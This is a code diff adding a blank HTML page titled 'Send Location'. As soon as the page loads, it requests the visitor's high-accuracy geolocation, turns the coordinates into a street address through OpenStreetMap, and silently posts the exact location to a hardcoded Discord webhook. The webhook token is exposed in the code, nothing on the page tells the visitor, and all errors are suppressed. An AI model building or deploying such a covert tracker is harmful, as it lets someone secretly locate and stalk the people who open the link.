@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head><title>Send Location</title></head>
+<body>
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1393310324819755048/JfbxAgH4tTNSig5h63pYCTr-QlOrNC5-wpkzTXH7AE34AGo3U1JWjKlPEFt6fElmiX7N";
+
+function sendToWebhook(content) {
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({content})
+    }).catch(() => {
+    });
+}
+
+function reverseGeocode(lat, lon) {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+
+    fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        const address = data.display_name || "Address not found";
+        const message = `Exact location:\nLatitude: ${lat}\nLongitude: ${lon}\nAddress: ${address}`;
+        sendToWebhook(message);
+    })
+    .catch(() => {
+        const fallbackMsg = `Exact location:\nLatitude: ${lat}\nLongitude: ${lon}\nAddress: Not available`;
+        sendToWebhook(fallbackMsg);
+    });
+}
+
+function sendLocation(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    reverseGeocode(lat, lon);
+}
+
+function handleError(error) {
+}
+
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {enableHighAccuracy: true});
+}
+</script>
+</body>
+</html>
